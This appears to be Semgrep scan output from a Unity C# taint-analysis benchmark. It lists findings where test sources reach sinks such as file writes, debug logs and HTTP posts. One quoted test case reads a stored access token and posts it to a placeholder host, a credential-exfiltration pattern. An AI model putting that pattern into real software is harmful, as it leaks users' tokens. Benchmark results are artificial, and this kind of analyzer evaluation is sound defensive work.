@@ -1,0 +1,616 @@
+{
+  "version": "1.166.0",
+  "results": [
+    {
+      "check_id": "semgrep-native-standard-benchmark-taint",
+      "path": "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.8P_CoreDataflow_DirectPass_18_P.cs",
+      "start": {
+        "line": 13,
+        "col": 9,
+        "offset": 405
+      },
+      "end": {
+        "line": 13,
+        "col": 63,
+        "offset": 459
+      },
+      "extra": {
+        "metavars": {},
+        "message": "Benchmark source reaches benchmark sink using Semgrep native taint mode",
+        "metadata": {},
+        "severity": "ERROR",
+        "fingerprint": "60fa4a77bbd1de6edbd86935be614d0f5c25568da8b16217b3029cc454e5a4534c756f0574c611cc1cfcdfcd4103811f064a88ae7397d46c48f5f2e6caf4eafc_0",
+        "lines": "        TestSinks.DangerousLoad(TestSources.GetNetworkInput());",
+        "is_ignored": false,
+        "validation_state": "NO_VALIDATOR",
+        "dataflow_trace": {
+          "taint_source": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.8P_CoreDataflow_DirectPass_18_P.cs",
+                "start": {
+                  "line": 13,
+                  "col": 33,
+                  "offset": 429
+                },
+                "end": {
+                  "line": 13,
+                  "col": 62,
+                  "offset": 458
+                }
+              },
+              "TestSources.GetNetworkInput()"
+            ]
+          ],
+          "intermediate_vars": [],
+          "taint_sink": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.8P_CoreDataflow_DirectPass_18_P.cs",
+                "start": {
+                  "line": 13,
+                  "col": 9,
+                  "offset": 405
+                },
+                "end": {
+                  "line": 13,
+                  "col": 63,
+                  "offset": 459
+                }
+              },
+              "TestSinks.DangerousLoad(TestSources.GetNetworkInput())"
+            ]
+          ]
+        },
+        "engine_kind": "OSS"
+      }
+    },
+    {
+      "check_id": "semgrep-native-standard-benchmark-taint",
+      "path": "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.9P_CoreDataflow_LocalVar_19_P.cs",
+      "start": {
+        "line": 14,
+        "col": 9,
+        "offset": 477
+      },
+      "end": {
+        "line": 14,
+        "col": 68,
+        "offset": 536
+      },
+      "extra": {
+        "metavars": {},
+        "message": "Benchmark source reaches benchmark sink using Semgrep native taint mode",
+        "metadata": {},
+        "severity": "ERROR",
+        "fingerprint": "d311f31a587671b90ba1288fbb198366ade221207c670e35373ad59cc8764a2e6add8113f6e387639708a4212386bb03a9956f89ca08aca26e02cb2be6d6f1c6_0",
+        "lines": "        TestSinks.DangerousFileWrite(\"/tmp/out.txt\", _payload_19_P);",
+        "is_ignored": false,
+        "validation_state": "NO_VALIDATOR",
+        "dataflow_trace": {
+          "taint_source": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.9P_CoreDataflow_LocalVar_19_P.cs",
+                "start": {
+                  "line": 13,
+                  "col": 32,
+                  "offset": 443
+                },
+                "end": {
+                  "line": 13,
+                  "col": 56,
+                  "offset": 467
+                }
+              },
+              "TestSources.GetUIInput()"
+            ]
+          ],
+          "intermediate_vars": [
+            {
+              "location": {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.9P_CoreDataflow_LocalVar_19_P.cs",
+                "start": {
+                  "line": 13,
+                  "col": 16,
+                  "offset": 427
+                },
+                "end": {
+                  "line": 13,
+                  "col": 29,
+                  "offset": 440
+                }
+              },
+              "content": "_payload_19_P"
+            }
+          ],
+          "taint_sink": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.9P_CoreDataflow_LocalVar_19_P.cs",
+                "start": {
+                  "line": 14,
+                  "col": 9,
+                  "offset": 477
+                },
+                "end": {
+                  "line": 14,
+                  "col": 68,
+                  "offset": 536
+                }
+              },
+              "TestSinks.DangerousFileWrite(\"/tmp/out.txt\", _payload_19_P)"
+            ]
+          ]
+        },
+        "engine_kind": "OSS"
+      }
+    },
+    {
+      "check_id": "semgrep-native-standard-benchmark-taint",
+      "path": "src/Assets\\Scripts\\_TestCases\\Category4-AsyncTemporal\\4.6N_AsyncTemporal_InvokeDelay_46_N.cs",
+      "start": {
+        "line": 9,
+        "col": 66,
+        "offset": 323
+      },
+      "end": {
+        "line": 9,
+        "col": 94,
+        "offset": 351
+      },
+      "extra": {
+        "metavars": {
+          "$METHOD": {
+            "start": {
+              "line": 9,
+              "col": 73,
+              "offset": 330
+            },
+            "end": {
+              "line": 9,
+              "col": 79,
+              "offset": 336
+            },
+            "abstract_content": "\"Emit\""
+          }
+        },
+        "message": "Benchmark source reaches benchmark sink using Semgrep native taint mode",
+        "metadata": {},
+        "severity": "ERROR",
+        "fingerprint": "4cebed565950502ad92c6141dfd40e490380ca19382c5bbaa6ad3943b55ae39009a459e7e40a81a19e50b84aab06563adbcc56f92dd7d63b7a0faa1ab1ef62b7_0",
+        "lines": "    void Start() { string value = TestSources.GetNetworkInput(); Invoke(\"Emit\", value.Length); }",
+        "is_ignored": false,
+        "validation_state": "NO_VALIDATOR",
+        "dataflow_trace": {
+          "taint_source": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category4-AsyncTemporal\\4.6N_AsyncTemporal_InvokeDelay_46_N.cs",
+                "start": {
+                  "line": 9,
+                  "col": 35,
+                  "offset": 292
+                },
+                "end": {
+                  "line": 9,
+                  "col": 64,
+                  "offset": 321
+                }
+              },
+              "TestSources.GetNetworkInput()"
+            ]
+          ],
+          "intermediate_vars": [
+            {
+              "location": {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category4-AsyncTemporal\\4.6N_AsyncTemporal_InvokeDelay_46_N.cs",
+                "start": {
+                  "line": 9,
+                  "col": 27,
+                  "offset": 284
+                },
+                "end": {
+                  "line": 9,
+                  "col": 32,
+                  "offset": 289
+                }
+              },
+              "content": "value"
+            }
+          ],
+          "taint_sink": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category4-AsyncTemporal\\4.6N_AsyncTemporal_InvokeDelay_46_N.cs",
+                "start": {
+                  "line": 9,
+                  "col": 66,
+                  "offset": 323
+                },
+                "end": {
+                  "line": 9,
+                  "col": 94,
+                  "offset": 351
+                }
+              },
+              "Invoke(\"Emit\", value.Length)"
+            ]
+          ]
+        },
+        "engine_kind": "OSS"
+      }
+    },
+    {
+      "check_id": "semgrep-native-privacy-benchmark-taint",
+      "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.1P_Privacy_DeviceIdentifierLog_91_P.cs",
+      "start": {
+        "line": 9,
+        "col": 20,
+        "offset": 264
+      },
+      "end": {
+        "line": 9,
+        "col": 64,
+        "offset": 308
+      },
+      "extra": {
+        "metavars": {},
+        "message": "Sensitive Unity data reaches a disclosure sink using Semgrep native taint mode",
+        "metadata": {},
+        "severity": "ERROR",
+        "fingerprint": "ce4167195a7c222e4105e4aa67bd57c37e1f4a8ca75a864af9448bb3229e713e647013e601932a6a8ddf1cb913f9dcdae3a1ed812037fc3c70777bdcac65fa32_0",
+        "lines": "    void Start() { Debug.Log(SystemInfo.deviceUniqueIdentifier); }",
+        "is_ignored": false,
+        "validation_state": "NO_VALIDATOR",
+        "dataflow_trace": {
+          "taint_source": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.1P_Privacy_DeviceIdentifierLog_91_P.cs",
+                "start": {
+                  "line": 9,
+                  "col": 30,
+                  "offset": 274
+                },
+                "end": {
+                  "line": 9,
+                  "col": 63,
+                  "offset": 307
+                }
+              },
+              "SystemInfo.deviceUniqueIdentifier"
+            ]
+          ],
+          "intermediate_vars": [],
+          "taint_sink": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.1P_Privacy_DeviceIdentifierLog_91_P.cs",
+                "start": {
+                  "line": 9,
+                  "col": 20,
+                  "offset": 264
+                },
+                "end": {
+                  "line": 9,
+                  "col": 64,
+                  "offset": 308
+                }
+              },
+              "Debug.Log(SystemInfo.deviceUniqueIdentifier)"
+            ]
+          ]
+        },
+        "engine_kind": "OSS"
+      }
+    },
+    {
+      "check_id": "semgrep-native-privacy-benchmark-taint",
+      "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.2P_Privacy_PlayerPrefsTokenHttp_92_P.cs",
+      "start": {
+        "line": 10,
+        "col": 74,
+        "offset": 349
+      },
+      "end": {
+        "line": 10,
+        "col": 142,
+        "offset": 417
+      },
+      "extra": {
+        "metavars": {
+          "$1": {
+            "start": {
+              "line": 1,
+              "col": 9,
+              "offset": 8
+            },
+            "end": {
+              "line": 1,
+              "col": 14,
+              "offset": 13
+            },
+            "abstract_content": "token"
+          },
+          "$KEY": {
+            "start": {
+              "line": 10,
+              "col": 57,
+              "offset": 332
+            },
+            "end": {
+              "line": 10,
+              "col": 71,
+              "offset": 346
+            },
+            "abstract_content": "\"access_token\""
+          }
+        },
+        "message": "Sensitive Unity data reaches a disclosure sink using Semgrep native taint mode",
+        "metadata": {},
+        "severity": "ERROR",
+        "fingerprint": "c40ccd62124b1ed2185110d6a9481b8092f7c927539da8167b6a7e196e369f2893259c1f315e33b5f9e7b968957c8fb42a5a3c1c0ea281b3d90ac4b6cdd1b0d1_0",
+        "lines": "    void Start() { string token = PlayerPrefs.GetString(\"access_token\"); UnityWebRequest.PostWwwForm(\"https://example.invalid/upload\", token); }",
+        "is_ignored": false,
+        "validation_state": "NO_VALIDATOR",
+        "dataflow_trace": {
+          "taint_source": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.2P_Privacy_PlayerPrefsTokenHttp_92_P.cs",
+                "start": {
+                  "line": 10,
+                  "col": 35,
+                  "offset": 310
+                },
+                "end": {
+                  "line": 10,
+                  "col": 72,
+                  "offset": 347
+                }
+              },
+              "PlayerPrefs.GetString(\"access_token\")"
+            ]
+          ],
+          "intermediate_vars": [
+            {
+              "location": {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.2P_Privacy_PlayerPrefsTokenHttp_92_P.cs",
+                "start": {
+                  "line": 10,
+                  "col": 27,
+                  "offset": 302
+                },
+                "end": {
+                  "line": 10,
+                  "col": 32,
+                  "offset": 307
+                }
+              },
+              "content": "token"
+            }
+          ],
+          "taint_sink": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.2P_Privacy_PlayerPrefsTokenHttp_92_P.cs",
+                "start": {
+                  "line": 10,
+                  "col": 74,
+                  "offset": 349
+                },
+                "end": {
+                  "line": 10,
+                  "col": 142,
+                  "offset": 417
+                }
+              },
+              "UnityWebRequest.PostWwwForm(\"https://example.invalid/upload\", token)"
+            ]
+          ]
+        },
+        "engine_kind": "OSS"
+      }
+    },
+    {
+      "check_id": "semgrep-native-privacy-benchmark-taint",
+      "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.4P_Privacy_MicrophoneLog_94_P.cs",
+      "start": {
+        "line": 9,
+        "col": 79,
+        "offset": 318
+      },
+      "end": {
+        "line": 9,
+        "col": 95,
+        "offset": 334
+      },
+      "extra": {
+        "metavars": {},
+        "message": "Sensitive Unity data reaches a disclosure sink using Semgrep native taint mode",
+        "metadata": {},
+        "severity": "ERROR",
+        "fingerprint": "e5d537a0d992b06d055f284405d5e8b9cdde255f281d1e912511bd5d7a149c608359fa5df473475c5d293b53e9fab6ccea2fc2979d58c6cad0755d768d8014fe_0",
+        "lines": "    void Start() { AudioClip voice = Microphone.Start(null, false, 1, 16000); Debug.Log(voice); }",
+        "is_ignored": false,
+        "validation_state": "NO_VALIDATOR",
+        "dataflow_trace": {
+          "taint_source": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.4P_Privacy_MicrophoneLog_94_P.cs",
+                "start": {
+                  "line": 9,
+                  "col": 38,
+                  "offset": 277
+                },
+                "end": {
+                  "line": 9,
+                  "col": 77,
+                  "offset": 316
+                }
+              },
+              "Microphone.Start(null, false, 1, 16000)"
+            ]
+          ],
+          "intermediate_vars": [
+            {
+              "location": {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.4P_Privacy_MicrophoneLog_94_P.cs",
+                "start": {
+                  "line": 9,
+                  "col": 30,
+                  "offset": 269
+                },
+                "end": {
+                  "line": 9,
+                  "col": 35,
+                  "offset": 274
+                }
+              },
+              "content": "voice"
+            }
+          ],
+          "taint_sink": [
+            "CliLoc",
+            [
+              {
+                "path": "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.4P_Privacy_MicrophoneLog_94_P.cs",
+                "start": {
+                  "line": 9,
+                  "col": 79,
+                  "offset": 318
+                },
+                "end": {
+                  "line": 9,
+                  "col": 95,
+                  "offset": 334
+                }
+              },
+              "Debug.Log(voice)"
+            ]
+          ]
+        },
+        "engine_kind": "OSS"
+      }
+    }
+  ],
+  "errors": [],
+  "paths": {
+    "scanned": [
+      "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.7N_CoreDataflow_Barrier_Chain_17_N.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.7P_CoreDataflow_Barrier_Chain_17_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.8P_CoreDataflow_DirectPass_18_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category1-CoreDataflow\\1.9P_CoreDataflow_LocalVar_19_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category3-UnityLifecycle\\3.11P_UnityLifecycle_Flow_311_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category3-UnityLifecycle\\3.9N_UnityLifecycle_Complex_39_N.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category3-UnityLifecycle\\3.9P_UnityLifecycle_Complex_39_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category4-AsyncTemporal\\4.3P_AsyncTemporal_DirectField_43_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category4-AsyncTemporal\\4.6N_AsyncTemporal_InvokeDelay_46_N.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category8-Composite\\8.2P_Composite_ReferenceAsyncOwner_82_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.1N_Privacy_DeviceIdentifierClean_91_N.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.1P_Privacy_DeviceIdentifierLog_91_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.2N_Privacy_NonSensitivePreference_92_N.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.2P_Privacy_PlayerPrefsTokenHttp_92_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.3P_Privacy_HeadPoseLog_93_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.4P_Privacy_MicrophoneLog_94_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.5P_Privacy_LocationLog_95_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.6P_Privacy_ClipboardHttp_96_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Category9-Privacy\\9.7P_Privacy_LifecycleCoroutineLog_97_P.cs",
+      "src/Assets\\Scripts\\_TestCases\\Helper\\CrossSceneData.cs",
+      "src/Assets\\Scripts\\_TestCases\\Helper\\CrossSceneSettings.cs",
+      "src/Assets\\Scripts\\_TestCases\\Helper\\ObjectIdentityHeap_InstanceBuffer.cs",
+      "src/Assets\\Scripts\\_TestCases\\Helper\\ObjectIdentityHeap_StaticInstanceBuffer.cs",
+      "src/Assets\\Scripts\\_TestCases\\Helper\\PrefabPayload.cs",
+      "src/Assets\\Scripts\\_TestCases\\Helper\\TargetReceiver.cs",
+      "src/Assets\\Scripts\\_TestCases\\Helper\\TestSinks.cs",
+      "src/Assets\\Scripts\\_TestCases\\Helper\\TestSources.cs"
+    ]
+  },
+  "time": {
+    "rules": [],
+    "rules_parse_time": 0.03280949592590332,
+    "profiling_times": {
+      "config_time": 0.175980806350708,
+      "core_time": 3.5727601051330566,
+      "ignores_time": 0.0,
+      "total_time": 3.7847464084625244
+    },
+    "parsing_time": {
+      "total_time": 0.0,
+      "per_file_time": {
+        "mean": 0.0,
+        "std_dev": 0.0
+      },
+      "very_slow_stats": {
+        "time_ratio": 0.0,
+        "count_ratio": 0.0
+      },
+      "very_slow_files": []
+    },
+    "scanning_time": {
+      "total_time": 0.2752363681793213,
+      "per_file_time": {
+        "mean": 0.010193939562197085,
+        "std_dev": 0.0007798882432854918
+      },
+      "very_slow_stats": {
+        "time_ratio": 0.0,
+        "count_ratio": 0.0
+      },
+      "very_slow_files": []
+    },
+    "matching_time": {
+      "total_time": 0.0,
+      "per_file_and_rule_time": {
+        "mean": 0.0,
+        "std_dev": 0.0
+      },
+      "very_slow_stats": {
+        "time_ratio": 0.0,
+        "count_ratio": 0.0
+      },
+      "very_slow_rules_on_files": []
+    },
+    "tainting_time": {
+      "total_time": 0.0,
+      "per_def_and_rule_time": {
+        "mean": 0.0,
+        "std_dev": 0.0
+      },
+      "very_slow_stats": {
+        "time_ratio": 0.0,
+        "count_ratio": 0.0
+      },
+      "very_slow_rules_on_defs": []
+    },
+    "fixpoint_timeouts": [],
+    "prefiltering": {
+      "project_level_time": 0.0,
+      "file_level_time": 0.0,
+      "rules_with_project_prefilters_ratio": 0.0,
+      "rules_with_file_prefilters_ratio": 1.0,
+      "rules_selected_ratio": 0.2962962962962963,
+      "rules_matched_ratio": 0.2962962962962963
+    },
+    "targets": [],
+    "total_bytes": 0,
+    "max_memory_bytes": 102943232
+  },
+  "engine_requested": "OSS",
+  "interfile_languages_used": [],
+  "skipped_rules": [],
+  "profiling_results": []
+}
